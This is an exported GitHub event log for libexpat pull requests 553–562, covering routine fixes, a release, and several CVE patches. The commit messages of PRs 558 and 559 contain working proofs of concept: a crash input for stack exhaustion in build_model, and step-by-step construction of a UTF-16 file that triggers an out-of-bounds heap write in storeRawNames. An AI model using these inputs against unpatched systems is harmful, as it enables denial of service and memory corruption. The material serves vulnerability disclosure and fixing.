553,IssueComment,2022-01-28 19:32:12,hartwork,fork_merge,"Hi @czentgr and @1480c1,

I think  @1480c1 is right about the C++ mode, and we had this exact case at #497 before, just with a different compiler. Out of the 8 places where `malloc_fcn` is called, 7 have casts and one doesn't. That's inconsistent. @czentgr would you be interested in flipping this PR around (can be reused using force push) and dropping the other casts so that this keeps notifying people about the wrong compiler mode? C++ is not a strict superset of C99 so fixing in that direction would be consistent and potentially helpful. What do you think?

Best, Sebastian","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024541204"", ""author_association"": ""MEMBER""}"
553,Labeled,2022-01-28 19:32:30,hartwork,fork_merge,compilation,
553,IssueComment,2022-01-28 19:42:04,czentgr,fork_merge,"@hartwork Yes, the Intel compiler used is a C++ compiler. We have used this for a long time this way (but not necessarily kept up with the changes of libexpat until recently for apparent reasons).
I'm ok with flipping this around. I need to do some more research on getting this to work in my environment. I can provide an update later. ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024576584"", ""author_association"": ""CONTRIBUTOR""}"
553,IssueComment,2022-01-28 19:57:25,hartwork,fork_merge,"@czentgr thanks for the update, see you soon","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024589633"", ""author_association"": ""MEMBER""}"
553,Revise,2022-01-28 23:15:49,czentgr,fork_merge,Remove casts from malloc_fcn usage,"{""sha"": ""55c7b0b1c481e58921179eef2ce3e5d20b3168d9"", ""author"": {""name"": ""czentgr"", ""email"": ""czentgr@us.ibm.com"", ""date"": ""2022-01-28T23:15:49Z""}, ""committer"": {""name"": ""czentgr"", ""email"": ""czentgr@us.ibm.com"", ""date"": ""2022-01-28T23:15:49Z""}}"
553,IssueComment,2022-01-28 23:17:25,czentgr,fork_merge,I made the changes for the other 7 occurrences. There are many other usages of malloc (plain malloc and the MALLOC macro which hides malloc_fcn). I didn't touch these.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024734821"", ""author_association"": ""CONTRIBUTOR""}"
553,RenameTitle,2022-01-28 23:36:27,hartwork,fork_merge,,"{""rename"": {""from"": ""Fix compiler void* assignment to XML_Char* error"", ""to"": ""Stop casting void* results from calls to .malloc_fcn""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5974029455""}"
553,ReviewApproved,2022-01-28 23:39:03,hartwork,fork_merge,"@czentgr looks good to me thank you! Should I squash merge or would you rather squash the two commits together yourself? 
@1480c1 what are you thoughts on dropping the casts?","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/553#pullrequestreview-866798413""}"
553,IssueComment,2022-01-28 23:41:31,1480c1,fork_merge,"although it seems clang-format is complaining, LGTM overall","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024745541"", ""author_association"": ""NONE""}"
553,IssueComment,2022-01-28 23:43:51,hartwork,fork_merge,@czentgr I now see that clang-format in the CI [expects a slightly different formatting](https://github.com/libexpat/libexpat/runs/4987653721?check_suite_focus=true#step:5:120). Could you run `./apply-clang-format.sh lib/xmlparse.c` locally (or apply [the diff seen in the CI log](https://github.com/libexpat/libexpat/runs/4987653721?check_suite_focus=true#step:5:120)) and squash the new formatting into your commits? (Force pushs to this PR are just fine.) Thanks in advance!,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024746732"", ""author_association"": ""MEMBER""}"
553,IssueComment,2022-01-28 23:44:51,hartwork,fork_merge,@1480c1 okay cool :+1: ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024747247"", ""author_association"": ""MEMBER""}"
553,Revise,2022-01-28 23:44:52,czentgr,fork_merge,Fix formatting,"{""sha"": ""633a9cfe43d0dbf3bb0393ce2b5f4f20eb2430b2"", ""author"": {""name"": ""czentgr"", ""email"": ""czentgr@us.ibm.com"", ""date"": ""2022-01-28T23:44:52Z""}, ""committer"": {""name"": ""czentgr"", ""email"": ""czentgr@us.ibm.com"", ""date"": ""2022-01-28T23:44:52Z""}}"
553,Labeled,2022-01-28 23:45:02,hartwork,fork_merge,enhancement,
553,IssueComment,2022-01-28 23:48:37,czentgr,fork_merge,@hartwork I saw the failure and made the change according to the diff. I just saw your and @1480c1 comments. Thanks for these. I'm so used to just push commits. Please squash them together on merge. Thanks!,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024749172"", ""author_association"": ""CONTRIBUTOR""}"
553,IssueComment,2022-01-28 23:51:19,hartwork,fork_merge,@czentgr thanks for the adjustments. I'll wait for all CI to be green and then merge. Thanks for your contribution! :+1: ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024750670"", ""author_association"": ""MEMBER""}"
553,MergePR,2022-01-29 00:21:41,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5974150290"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/d97a123d0b48f6a36f3bcc1984b4c287243718fc""}"
554,SubmitCommit,2022-01-29 22:20:18,hartwork,unfork_merge,Changes: Document #546,"{""sha"": ""6c7c96d98c3cf40dc198f9c5787c00af234006f5"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T21:21:45Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:20:18Z""}}"
554,SubmitCommit,2022-01-29 22:20:18,hartwork,unfork_merge,"Bump version info from 9:3:8 to 9:4:8

See https://verbump.de/ for what these numbers do","{""sha"": ""2a0add0a7a2b03af70b5d0db88baeec66d930ff5"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T21:27:41Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:20:18Z""}}"
554,SubmitCommit,2022-01-29 22:20:49,hartwork,unfork_merge,Bump version to 2.4.4,"{""sha"": ""a445be8e0d15aff2d2cfcb58b18525b9b2eccc6a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T21:28:15Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:20:49Z""}}"
554,SubmitCommit,2022-01-29 22:28:05,hartwork,unfork_merge,Sync file headers,"{""sha"": ""039af6611d0c28e879196698ee0f6707d430d855"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T21:36:08Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:28:05Z""}}"
554,SubmitCommit,2022-01-29 22:28:05,hartwork,unfork_merge,Set expected release date for 2.4.4,"{""sha"": ""0afb2df6a9d429a0a78d2d65a5cb72140ee9df3a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T21:38:42Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:28:05Z""}}"
554,SubmitCommit,2022-01-29 22:28:05,hartwork,unfork_merge,xmlwf.xml: Adapt note to current practice,"{""sha"": ""da3dcd4ecfb41e825a66021b281cbaf07bbd6f3f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T21:40:13Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:28:05Z""}}"
554,SubmitCommit,2022-01-29 22:28:05,hartwork,unfork_merge,.gitignore: Add missing,"{""sha"": ""26b677744c2eff96ce619004473d8e7680d8c92f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T21:46:52Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:28:05Z""}}"
554,SubmitCommit,2022-01-29 22:28:05,hartwork,unfork_merge,"doc: Drop unused file valid-xhtml10.png

Unused since commit 30c4aa85f530f279d8c9cc2f584fa9a9df7e2bf1 of 2.4.0","{""sha"": ""c322e14f9f9c7203f058737cc02a001b3cd9a143"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:12:44Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:28:05Z""}}"
554,Labeled,2022-01-29 22:31:26,hartwork,unfork_merge,security,
554,Labeled,2022-01-29 22:31:26,hartwork,unfork_merge,releasing,
554,OpenPR,2022-01-29 22:31:26,hartwork,unfork_merge,,
554,Revise,2022-01-29 22:33:09,hartwork,unfork_merge,win32: Add missing files to the installer,"{""sha"": ""3ce557eecbe83499a214340a884a2d035d521f0e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:17:44Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-29T22:33:09Z""}}"
554,HeadRefForcePushed,2022-01-29 22:34:13,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5975598126"", ""commit_url"": null}"
554,MergePR,2022-01-30 00:09:37,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5975667139"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/81b89678e200820271b72cacdd45fb5868855765""}"
554,DeleteBranch,2022-01-30 00:09:48,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5975667314"", ""commit_url"": null}"
558,SubmitCommit,2022-02-15 12:16:23,ferivoz,fork_merge,"Prevent stack exhaustion in build_model

It is possible to trigger stack exhaustion in build_model function if
depth of nested children in DTD element is large enough. This happens
because build_node is a recursively called function within build_model.

The code has been adjusted to run iteratively. It uses the already
allocated heap space as temporary stack (growing from top to bottom).

Output is identical to recursive version. No new fields in data
structures were added, i.e. it keeps full API and ABI compatibility.
Instead the numchildren variable is used to temporarily keep the
index of items (uint vs int).

Documentation and readability improvements kindly added by Sebastian.

Proof of Concept:

1. Compile poc binary which parses XML file line by line

```
cat > poc.c << EOF
 #include <err.h>
 #include <expat.h>
 #include <stdio.h>

 XML_Parser parser;

 static void XMLCALL
 dummy_element_decl_handler(void *userData, const XML_Char *name,
                            XML_Content *model) {
   XML_FreeContentModel(parser, model);
 }

 int main(int argc, char *argv[]) {
   FILE *fp;
   char *p = NULL;
   size_t s = 0;
   ssize_t l;
   if (argc != 2)
     errx(1, ""usage: poc poc.xml"");
   if ((parser = XML_ParserCreate(NULL)) == NULL)
     errx(1, ""XML_ParserCreate"");
   XML_SetElementDeclHandler(parser, dummy_element_decl_handler);
   if ((fp = fopen(argv[1], ""r"")) == NULL)
     err(1, ""fopen"");
   while ((l = getline(&p, &s, fp)) > 0)
     if (XML_Parse(parser, p, (int)l, XML_FALSE) != XML_STATUS_OK)
       errx(1, ""XML_Parse"");
   XML_ParserFree(parser);
   free(p);
   fclose(fp);
   return 0;
 }
EOF
cc -std=c11 -D_POSIX_C_SOURCE=200809L -lexpat -o poc poc.c
```

2. Create XML file with a lot of nested groups in DTD element

```
cat > poc.xml.zst.b64 << EOF
KLUv/aQkACAAPAEA+DwhRE9DVFlQRSB1d3UgWwo8IUVMRU1FTlQgdXd1CigBAHv/58AJAgAQKAIA
ECgCABAoAgAQKAIAECgCABAoAgAQKHwAAChvd28KKQIA2/8gV24XBAIAECkCABApAgAQKQIAECkC
ABApAgAQKQIAEClVAAAgPl0+CgEA4A4I2VwwnQ==
EOF
base64 -d poc.xml.zst.b64 | zstd -d > poc.xml
```

3. Run Proof of Concept

```
./poc poc.xml
```

Co-authored-by: Sebastian Pipping <sebastian@pipping.org>","{""sha"": ""9b4ce651b26557f16103c3a366c91934ecd439ab"", ""author"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-15T11:54:29Z""}, ""committer"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-15T12:16:23Z""}}"
558,OpenPR,2022-02-15 12:17:44,ferivoz,fork_merge,,
558,Labeled,2022-02-15 17:17:19,hartwork,fork_merge,bug,
558,Labeled,2022-02-15 17:17:19,hartwork,fork_merge,security,
558,CrossReferenced,2022-02-15 17:18:39,hartwork,fork_merge,Release Expat 2.4.5,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/557"", ""is_pull_request"": false}}"
558,IssueComment,2022-02-18 07:31:18,carnil,fork_merge,This appears to be [CVE-2022-25313](https://www.cve.org/CVERecord?id=CVE-2022-25313),"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1044059621"", ""author_association"": ""NONE""}"
558,RenameTitle,2022-02-18 16:33:31,hartwork,fork_merge,,"{""rename"": {""from"": ""Prevent stack exhaustion in build_model"", ""to"": ""[CVE-2022-25313] lib: Prevent stack exhaustion in build_model""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100642235""}"
558,MergePR,2022-02-18 16:59:50,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100856833"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/bbdfcfef4747d2d66e81c19f4a55e29e291aa171""}"
558,Referenced,2022-02-18 19:20:18,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6101870710"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/e2d43320ce28949dcb91841c3e16f2b6fb4a2271""}"
558,CrossReferenced,2022-02-22 09:20:55,Tzoockee,fork_merge,[request] <EXPAT>/<2.4.6>,"{""reference"": {""url"": ""https://api.github.com/repos/conan-io/conan-center-index/issues/9471"", ""is_pull_request"": false}}"
559,SubmitCommit,2022-02-15 12:17:18,ferivoz,fork_merge,"Prevent integer overflow in storeRawNames

It is possible to use an integer overflow in storeRawNames for out of
boundary heap writes. Default configuration is affected. If compiled
with XML_UNICODE then the attack does not work. Compiling with
-fsanitize=address confirms the following proof of concept.

The problem can be exploited by abusing the m_buffer expansion logic.
Even though the initial size of m_buffer is a power of two, eventually
it can end up a little bit lower, thus allowing allocations very close
to INT_MAX (since INT_MAX/2 can be surpassed). This means that tag
names can be parsed which are almost INT_MAX in size.

Unfortunately (from an attacker point of view) INT_MAX/2 is also a
limitation in string pools. Having a tag name of INT_MAX/2 characters
or more is not possible.

Expat can convert between different encodings. UTF-16 documents which
contain only ASCII representable characters are twice as large as their
ASCII encoded counter-parts.

The proof of concept works by taking these three considerations into
account:

1. Move the m_buffer size slightly below a power of two by having a
   short root node <a>. This allows the m_buffer to grow very close
   to INT_MAX.
2. The string pooling forbids tag names longer than or equal to
   INT_MAX/2, so keep the attack tag name smaller than that.
3. To be able to still overflow INT_MAX even though the name is
   limited at INT_MAX/2-1 (nul byte) we use UTF-16 encoding and a tag
   which only contains ASCII characters. UTF-16 always stores two
   bytes per character while the tag name is converted to using only
   one. Our attack node byte count must be a bit higher than
   2/3 INT_MAX so the converted tag name is around INT_MAX/3 which
   in sum can overflow INT_MAX.

Thanks to our small root node, m_buffer can handle 2/3 INT_MAX bytes
without running into INT_MAX boundary check. The string pooling is
able to store INT_MAX/3 as tag name because the amount is below
INT_MAX/2 limitation. And creating the sum of both eventually overflows
in storeRawNames.

Proof of Concept:

1. Compile expat with -fsanitize=address.

2. Create Proof of Concept binary which iterates through input
   file 16 MB at once for better performance and easier integer
   calculations:

```
cat > poc.c << EOF
 #include <err.h>
 #include <expat.h>
 #include <stdlib.h>
 #include <stdio.h>

 #define CHUNK (16 * 1024 * 1024)
 int main(int argc, char *argv[]) {
   XML_Parser parser;
   FILE *fp;
   char *buf;
   int i;

   if (argc != 2)
     errx(1, ""usage: poc file.xml"");
   if ((parser = XML_ParserCreate(NULL)) == NULL)
     errx(1, ""failed to create expat parser"");
   if ((fp = fopen(argv[1], ""r"")) == NULL) {
     XML_ParserFree(parser);
     err(1, ""failed to open file"");
   }
   if ((buf = malloc(CHUNK)) == NULL) {
     fclose(fp);
     XML_ParserFree(parser);
     err(1, ""failed to allocate buffer"");
   }
   i = 0;
   while (fread(buf, CHUNK, 1, fp) == 1) {
     printf(""iteration %d: XML_Parse returns %d\n"", ++i,
       XML_Parse(parser, buf, CHUNK, XML_FALSE));
   }
   free(buf);
   fclose(fp);
   XML_ParserFree(parser);
   return 0;
 }
EOF
gcc -fsanitize=address -lexpat -o poc poc.c
```

3. Construct specially prepared UTF-16 XML file:

```
dd if=/dev/zero bs=1024 count=794624 | tr '\0' 'a' > poc-utf8.xml
echo -n '<a><' | dd conv=notrunc of=poc-utf8.xml
echo -n '><' | dd conv=notrunc of=poc-utf8.xml bs=1 seek=805306368
iconv -f UTF-8 -t UTF-16LE poc-utf8.xml > poc-utf16.xml
```

4. Run proof of concept:

```
./poc poc-utf16.xml
```","{""sha"": ""eb0362808b4f9f1e2345a0cf203b8cc196d776d9"", ""author"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-15T11:55:46Z""}, ""committer"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-15T12:17:18Z""}}"
559,OpenPR,2022-02-15 12:18:18,ferivoz,fork_merge,,
559,Labeled,2022-02-15 17:15:48,hartwork,fork_merge,bug,
559,Labeled,2022-02-15 17:15:48,hartwork,fork_merge,security,
559,CrossReferenced,2022-02-15 17:18:39,hartwork,fork_merge,Release Expat 2.4.5,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/557"", ""is_pull_request"": false}}"
559,IssueComment,2022-02-18 07:28:05,carnil,fork_merge,This issue appears to be [CVE-2022-25315](https://www.cve.org/CVERecord?id=CVE-2022-25315),"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1044056574"", ""author_association"": ""NONE""}"
559,RenameTitle,2022-02-18 16:35:28,hartwork,fork_merge,,"{""rename"": {""from"": ""Prevent integer overflow in storeRawNames"", ""to"": ""[CVE-2022-25315] lib: Prevent integer overflow in storeRawNames""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100656460""}"
559,MergePR,2022-02-18 17:00:25,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100861563"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/89214940efd13e3b83fa078fd70eb4dbdc04c4a5""}"
559,Referenced,2022-02-18 19:20:18,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6101870716"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/e2d43320ce28949dcb91841c3e16f2b6fb4a2271""}"
559,CrossReferenced,2022-02-22 09:20:55,Tzoockee,fork_merge,[request] <EXPAT>/<2.4.6>,"{""reference"": {""url"": ""https://api.github.com/repos/conan-io/conan-center-index/issues/9471"", ""is_pull_request"": false}}"
560,SubmitCommit,2022-02-15 12:16:57,ferivoz,fork_merge,"Prevent integer overflow in copyString

The copyString function is only used for encoding string supplied by
the library user.","{""sha"": ""efcb347440ade24b9f1054671e6bd05e60b4cafd"", ""author"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-15T11:56:57Z""}, ""committer"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-02-15T12:16:57Z""}}"
560,OpenPR,2022-02-15 12:18:48,ferivoz,fork_merge,,
560,Labeled,2022-02-15 17:14:02,hartwork,fork_merge,bug,
560,Labeled,2022-02-15 17:14:02,hartwork,fork_merge,security,
560,CrossReferenced,2022-02-15 17:18:39,hartwork,fork_merge,Release Expat 2.4.5,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/557"", ""is_pull_request"": false}}"
560,IssueComment,2022-02-18 07:29:46,carnil,fork_merge,This appears to be [CVE-2022-25314](https://www.cve.org/CVERecord?id=CVE-2022-25314),"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1044058172"", ""author_association"": ""NONE""}"
560,RenameTitle,2022-02-18 16:34:44,hartwork,fork_merge,,"{""rename"": {""from"": ""Prevent integer overflow in copyString"", ""to"": ""[CVE-2022-25314] lib: Prevent integer overflow in copyString""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100651241""}"
560,MergePR,2022-02-18 17:00:46,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100864745"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/d477fdd284468f2ab822024e75702f2c1b254f42""}"
560,Referenced,2022-02-18 19:20:18,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6101870723"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/e2d43320ce28949dcb91841c3e16f2b6fb4a2271""}"
560,CrossReferenced,2022-02-22 09:20:55,Tzoockee,fork_merge,[request] <EXPAT>/<2.4.6>,"{""reference"": {""url"": ""https://api.github.com/repos/conan-io/conan-center-index/issues/9471"", ""is_pull_request"": false}}"
561,Labeled,2022-02-15 17:47:12,hartwork,unfork_merge,bug,
561,OpenPR,2022-02-15 17:47:12,hartwork,unfork_merge,,
561,Labeled,2022-02-15 17:47:12,hartwork,unfork_merge,security,
561,CrossReferenced,2022-02-15 17:48:24,hartwork,unfork_merge,Release Expat 2.4.5,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/557"", ""is_pull_request"": false}}"
561,HeadRefForcePushed,2022-02-15 18:15:18,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6077177550"", ""commit_url"": null}"
561,IssueComment,2022-02-15 22:25:04,hartwork,unfork_merge,CVE requested from Mitre just now.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1040858799"", ""author_association"": ""MEMBER""}"
561,IssueComment,2022-02-16 01:05:33,hartwork,unfork_merge,Received `CVE-2022-25236`.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1040970329"", ""author_association"": ""MEMBER""}"
561,RenameTitle,2022-02-16 01:05:45,hartwork,unfork_merge,,"{""rename"": {""from"": ""Protect against insertion of namesep characters into namespace URIs"", ""to"": ""[CVE-2022-25236] lib: Protect against insertion of namesep characters into namespace URIs""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6079260698""}"
561,Revise,2022-02-16 01:06:23,hartwork,unfork_merge,lib: Fix (harmless) use of uninitialized memory,"{""sha"": ""6881a4fc8596307ab9ff2e85e605afa2e413ab71"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-11T23:19:13Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-16T01:06:23Z""}}"
561,Revise,2022-02-16 01:07:19,hartwork,unfork_merge,lib: Protect against malicious namespace declarations (CVE-2022-25236),"{""sha"": ""a2fe525e660badd64b6c557c2b1ec26ddc07f6e4"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-12T00:09:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-16T01:07:19Z""}}"
561,Revise,2022-02-16 01:07:31,hartwork,unfork_merge,tests: Cover CVE-2022-25236,"{""sha"": ""2de077423fb22750ebea599677d523b53cb93b1d"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-11T23:51:43Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-16T01:07:31Z""}}"
561,Revise,2022-02-16 01:07:31,hartwork,unfork_merge,Changes: Document CVE-2022-25236,"{""sha"": ""e4d7e49782dafed160f0af8af907681dfd35bda7"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-12T00:30:47Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-02-16T01:07:31Z""}}"
561,HeadRefForcePushed,2022-02-16 01:08:01,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6079275612"", ""commit_url"": null}"
561,MergePR,2022-02-18 17:01:27,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100870557"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/2cc97e875ef84da4bcf55156c83599116f7523b4""}"
561,DeleteBranch,2022-02-18 17:02:03,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6100875167"", ""commit_url"": null}"
561,CrossReferenced,2022-02-22 09:20:55,Tzoockee,unfork_merge,[request] <EXPAT>/<2.4.6>,"{""reference"": {""url"": ""https://api.github.com/repos/conan-io/conan-center-index/issues/9471"", ""is_pull_request"": false}}"
561,CrossReferenced,2022-02-23 23:18:45,hartwork,unfork_merge,WBXML_NAMESPACE_SEPARATOR ':' incompatible with Expat >=2.4.5 security fixes,"{""reference"": {""url"": ""https://api.github.com/repos/libwbxml/libwbxml/issues/76"", ""is_pull_request"": false}}"
561,CrossReferenced,2022-02-24 15:59:40,hartwork,unfork_merge,"[>=2.4.5] Fix to CVE-2022-25236 breaks biboumi, ClairMeta, jxmlease, libwbxml, openleadr-python, rnv, xmltodict","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/572"", ""is_pull_request"": false}}"
561,CrossReferenced,2022-02-24 18:17:03,hartwork,unfork_merge,Namespace separator ':' incompatible with Expat >=2.4.5 <2.4.7 security fixes,"{""reference"": {""url"": ""https://api.github.com/repos/martinblech/xmltodict/issues/289"", ""is_pull_request"": false}}"
561,Referenced,2022-02-28 10:06:58,sebageek,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6153502078"", ""commit_url"": ""https://api.github.com/repos/sapcc/asr1k-neutron-l3/commits/d4743c34f58ed835eab56114569ce9b5a7982aa1""}"
561,CrossReferenced,2022-02-28 10:07:26,sebageek,unfork_merge,Use different namespace_separator with new libexpat,"{""reference"": {""url"": ""https://api.github.com/repos/sapcc/asr1k-neutron-l3/issues/77"", ""is_pull_request"": true}}"
561,Referenced,2022-02-28 10:12:26,sebageek,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6153539391"", ""commit_url"": ""https://api.github.com/repos/sapcc/asr1k-neutron-l3/commits/90ee7ac7cd7eb54980d46ee5134f0a95c7bafbc9""}"
561,CrossReferenced,2022-03-04 23:54:51,hartwork,unfork_merge, fast_xml requires Expat >=2.4.5 (or backported fixes) for secure operation,"{""reference"": {""url"": ""https://api.github.com/repos/processone/fast_xml/issues/46"", ""is_pull_request"": false}}"
561,CrossReferenced,2022-03-04 23:58:37,hartwork,unfork_merge,xmp3 requires Expat >=2.4.5 (or backported fixes) for secure operation,"{""reference"": {""url"": ""https://api.github.com/repos/BellerophonMobile/xmp3/issues/1"", ""is_pull_request"": false}}"
561,CrossReferenced,2022-06-09 09:45:47,linzhuorong,unfork_merge,"[>=2.4.5] After fixing CVE-2022-25236, some xml texts cannot be parsed properly?","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/604"", ""is_pull_request"": false}}"
562,Labeled,2022-02-15 17:56:05,hartwork,unfork_merge,bug,
562,OpenPR,2022-02-15 17:56:05,hartwork,unfork_merge,,
562,Labeled,2022-02-15 17:56:05,hartwork,unfork_merge,security,
562,CrossReferenced,2022-02-15 17:57:46,hartwork,unfork_merge,Release Expat 2.4.5,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/557"", ""is_pull_request"": false}}"
562,HeadRefForcePushed,2022-02-15 18:12:08,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6077158314"", ""commit_url"": null}"
562,HeadRefForcePushed,2022-02-15 18:35:57,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6077299224"", ""commit_url"": null}"
562,HeadRefForcePushed,2022-02-15 19:22:10,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6077658792"", ""commit_url"": null}"
562,HeadRefForcePushed,2022-02-15 20:44:31,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6078136924"", ""commit_url"": null}"
562,IssueComment,2022-02-15 22:24:23,hartwork,unfork_merge,CVE requested from Mitre just now.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1040858224"", ""author_association"": ""MEMBER""}"
562,RenameTitle,2022-02-16 01:00:32,hartwork,unfork_merge,,"{""rename"": {""from"": ""Protect against malformed encoding (e.g. malformed UTF-8)"", ""to"": ""[CVE-2022-25236] lib: Protect against malformed encoding (e.g. malformed UTF-8)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6079226585""}"
562,IssueComment,2022-02-16 01:00:42,hartwork,unfork_merge,Received `CVE-2022-25235`.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1040962791"", ""author_association"": ""MEMBER""}"
